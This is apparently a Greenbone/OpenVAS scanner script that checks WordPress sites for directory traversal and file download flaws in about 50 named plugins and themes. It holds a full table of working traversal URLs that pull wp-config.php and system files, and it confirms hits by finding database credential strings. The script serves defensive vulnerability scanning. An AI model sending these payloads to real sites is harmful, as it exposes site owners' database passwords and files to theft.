CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.117055" );
	script_version( "2021-09-28T12:25:24+0000" );
	script_cve_id( "CVE-2007-6369", "CVE-2013-7240", "CVE-2014-4940", "CVE-2014-5368", "CVE-2014-8799", "CVE-2014-9119", "CVE-2014-9734", "CVE-2015-1000005", "CVE-2015-1000006", "CVE-2015-1000007", "CVE-2015-1000010", "CVE-2015-1000012", "CVE-2015-1579", "CVE-2015-4414", "CVE-2015-4694", "CVE-2015-4703", "CVE-2015-4704", "CVE-2015-5468", "CVE-2015-5469", "CVE-2015-5471", "CVE-2015-5472", "CVE-2015-5609", "CVE-2015-9406", "CVE-2015-9470", "CVE-2015-9480", "CVE-2016-10956", "CVE-2017-1002008", "CVE-2018-16283", "CVE-2018-16299", "CVE-2018-7422", "CVE-2018-9118", "CVE-2019-14205", "CVE-2019-14206", "CVE-2019-9618", "CVE-2020-11738", "CVE-2021-39316" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-09-28 12:25:24 +0000 (Tue, 28 Sep 2021)" );
	script_tag( name: "creation_date", value: "2020-11-20 08:15:18 +0000 (Fri, 20 Nov 2020)" );
	script_name( "WordPress Multiple Plugins / Themes Directory Traversal / File Download Vulnerability (HTTP)" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2020 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "summary", value: "Multiple WordPress Plugins / Themes are prone to a directory
  traversal or file download vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "impact", value: "Successful exploitation will allow a remote attacker to download
  arbitrary files." );
	script_tag( name: "affected", value: "The following WordPress Plugins / Themes are known to be
  affected:

  - Product Input Fields for WooCommerce

  - Slider Revolution (revslider)

  - MiwoFTP

  - aspose-doc-exporter

  - candidate-application-form

  - cloudsafe365-for-wp

  - db-backup

  - google-mp3-audio-player

  - hb-audio-gallery-lite

  - history-collection

  - old-post-spinner

  - pica-photo-gallery

  - pictpress

  - recent-backups

  - wptf-image-gallery

  - mTheme-Unus

  - parallelus-mingle

  - parallelus-salutation

  - tinymce-thumbnail-gallery

  - simple-image-manipulator

  - site-import

  - robotcpa

  - Duplicator (Free and Pro)

  - mypixs

  - Membership Simplified (membership-simplified-for-oap-members-only)

  - ibs-Mappro

  - wp-ecommerce-shop-styling

  - wp-swimteam

  - mdc-youtube-downloader

  - image-export

  - zip-attachments

  - download-zip-attachments

  - se-html5-album-audio-player

  - wp-instance-rename

  - wp-license.php (unknown plugin)

  - adaptive-images

  - gracemedia-media-player

  - localize-my-post

  - site-editor

  - wechat-broadcast

  - simple-fields

  - tutor

  - mail-masta

  - wp-vault

  - wpsite-background-takeover

  - NativeChurch

  - wordfence

  - memphis-documents-library

  - advanced-dewplayer

  - dukapress

  - wp-source-control

  - tera-charts

  - Zoomsounds" );
	script_tag( name: "solution", value: "Please contact the vendor for additional information regarding
  potential updates. If none exist, remove the plugin / theme." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_timeout( 900 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
checks = make_array();
checks["/wp-admin/admin-ajax.php?action=revslider_show_image&img="] = "../wp-config.php";
checks["/wp-admin/admin-post.php?alg_wc_pif_download_file="] = "../../../../../wp-config.php";
checks["/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/cloudsafe365-for-wp/admin/editor/cs365_edit.php?file="] = "..%2F..%2F..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/db-backup/download.php?file="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/google-mp3-audio-player/direct_download.php?file="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_size=10&file_path="] = "..%2F..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/history-collection/download.php?var="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/old-post-spinner/logview.php?ops_file="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/pica-photo-gallery/picadownload.php?imgname="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/pictpress/resize.php?size="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/recent-backups/download-file.php?file_link="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url="] = "../../../../wp-config.php";
checks["/wp-content/themes/mTheme-Unus/css/css.php?files="] = "../../../../wp-config.php";
checks["/wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php?file="] = "../../../../../../wp-config.php";
checks["/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file="] = "../../../../../../wp-config.php";
checks["/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href="] = "..%2F..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath="] = "..%2F..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/site-import/admin/page.php?url="] = "..%2F..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/robotcpa/f.php?l="] = "..%2F..%2F..%2Fwp-config.php";
checks["/wp-content/plugins/mypixs/mypixs/downloadpage.php?url="] = "../../../../wp-config.php";
checks["/wp-content/plugins/image-export/download.php?file="] = "../../../wp-config.php";
checks["/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file="] = "../../../../wp-config.php";
checks["/wp-content/plugins/ibs-mappro/lib/download.php?file="] = "../../../../wp-config.php";
checks["/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads"] = "../../../wp-config.php";
checks["/wp-content/plugins/download-zip-attachments/download.php?File="] = "../../../wp-config.php";
checks["/wp-content/plugins/zip-attachments/download.php?za_filename=check&za_file="] = "../../../wp-config.php";
checks["/wp-admin/admin-ajax.php?action=duplicator_download&file="] = "..%2Fwp-config.php";
checks["/wp-content/plugins/wp-swimteam/include/user/download.php?contenttype=force-download&transient=1&abspath=/usr/share/wordpress&filename=check&file="] = "../../../../../wp-config.php";
checks["/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename="] = "../../../../wp-config.php";
checks["/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file="] = "..././..././..././wp-config.php";
checks["/wp-license.php?file="] = "./wp-config.php";
checks["/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]="] = "../../../wp-config.php";
checks["/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg="] = "../../../../../wp-config.php";
checks["/wp-content/plugins/localize-my-post/ajax/include.php?file="] = "../../../../wp-config.php";
checks["/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path="] = "../../../../../../../wp-config.php";
checks["/wp-content/plugins/wechat-broadcast/wechat/Image.php?url="] = "../../../../wp-config.php";
checks["?wpv-image="] = "../wp-config.php";
checks["/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename="] = "../../../../wp-config.php";
checks["/wp-content/themes/NativeChurch/download/download.php?file="] = "../../../../../../../wp-config.php";
checks["/wp-content/plugins/wordfence/lib/wordfenceClass.php?file="] = "../../../../wp-config.php";
checks["/?mdocs-img-preview="] = "../../../wp-config.php";
checks["/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file="] = "../../../../wp-config.php";
checks["/wp-content/plugins/dukapress/lib/dp_image.php?src="] = "../../../../wp-config.php";
checks["/wp-content/plugins/wp-source-control/downloadfiles/download.php?path="] = "../../../../wp-config.php";
checks["/wp-content/plugins/tera-charts/charts/zoomabletreemap.php?fn="] = "../../../../wp-config.php";
checks["/?action=dzsap_download&link="] = "../../../wp-config.php";
report = "The following URLs are vulnerable:\n";
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for vuln_file in keys( checks ) {
	wp_config_file = checks[vuln_file];
	url = dir + vuln_file + wp_config_file;
	req = http_get( port: port, item: url );
	res = http_keepalive_send_recv( port: port, data: req );
	if(res && IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
		body = http_extract_body_from_response( data: res );
		if( body && ContainsString( body, "DB_NAME" ) && ContainsString( body, "DB_USER" ) && ContainsString( body, "DB_PASSWORD" ) ){
			report += "\n" + http_report_vuln_url( port: port, url: url, url_only: TRUE );
			VULN = TRUE;
		}
		else {
			if(IsMatchRegexp( res, "Content-Type\\s*:\\s*application/(force-download|zip|pdf|octet-stream)" ) && IsMatchRegexp( res, "Content-Disposition\\s*:\\s*(attachment; )?filename=" )){
				report += "\n" + http_report_vuln_url( port: port, url: url, url_only: TRUE );
				VULN = TRUE;
			}
		}
	}
	for pattern in keys( files ) {
		file = files[pattern];
		if( ContainsString( wp_config_file, "..%2F" ) ) {
			url = dir + vuln_file + crap( length: 10 * 5, data: "..%2F" ) + file;
		}
		else {
			if( ContainsString( wp_config_file, "..././" ) ) {
				url = dir + vuln_file + crap( length: 10 * 6, data: "..././" ) + file;
			}
			else {
				if( ContainsString( wp_config_file, "/wp-content/plugins/mypixs/mypixs/" ) ) {
					url = dir + vuln_file + "/" + file;
				}
				else {
					if( IsMatchRegexp( wp_config_file, "/wp-content/plugins/(image-export|mdc-youtube-downloader|ibs-mappro/lib)/" ) ) {
						url = dir + vuln_file + "/" + file;
					}
					else {
						url = dir + vuln_file + crap( length: 10 * 3, data: "../" ) + file;
					}
				}
			}
		}
		req = http_get( port: port, item: url );
		res = http_keepalive_send_recv( port: port, data: req );
		if(!res || !IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
			continue;
		}
		body = http_extract_body_from_response( data: res );
		if( body && egrep( string: body, pattern: pattern ) ){
			report += "\n" + http_report_vuln_url( port: port, url: url, url_only: TRUE );
			VULN = TRUE;
		}
		else {
			if(IsMatchRegexp( res, "Content-Type\\s*:\\s*application/(force-download|zip|pdf|octet-stream)" ) && IsMatchRegexp( res, "Content-Disposition\\s*:\\s*(attachment; )?filename=" )){
				report += "\n" + http_report_vuln_url( port: port, url: url, url_only: TRUE );
				VULN = TRUE;
			}
		}
	}
}
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/wp-content/plugins/wp-instance-rename/mysqldump_download.php";
	headers = make_array( "Content-Type", "application/x-www-form-urlencoded" );
	data = "dbname=wp&backup_folder=./backup/&dumpfname=/" + file;
	req = http_post_put_req( port: port, url: url, data: data, add_headers: headers );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!res || !IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
		continue;
	}
	if(IsMatchRegexp( res, "Content-Type\\s*:\\s*application/octet-stream" ) && IsMatchRegexp( res, "Content-Disposition\\s*:\\s*attachment; filename=wp_" )){
		report += "\n" + http_report_vuln_url( port: port, url: url, url_only: TRUE );
		VULN = TRUE;
	}
}
for pattern in keys( files ) {
	file = files[pattern];
	urls = make_list( dir + "/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/" + file + "%00",
		 dir + "/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/" + file,
		 dir + "/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/" + file,
		 dir + "/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/" + file );
	for url in urls {
		if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: pattern )){
			report += "\n" + http_report_vuln_url( port: port, url: url, url_only: TRUE );
			VULN = TRUE;
		}
	}
}
files = make_list( "/index.php?action=download&option=com_miwoftp&item=wp-config.php",
	 "/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&item=wp-config.php&order=name&srt=yes" );
for file in files {
	url = dir + file;
	if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "DB_NAME", extra_check: make_list( "DB_USER",
		 "DB_PASSWORD" ) )){
		report += "\n" + http_report_vuln_url( port: port, url: url, url_only: TRUE );
		VULN = TRUE;
	}
}
if(VULN){
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

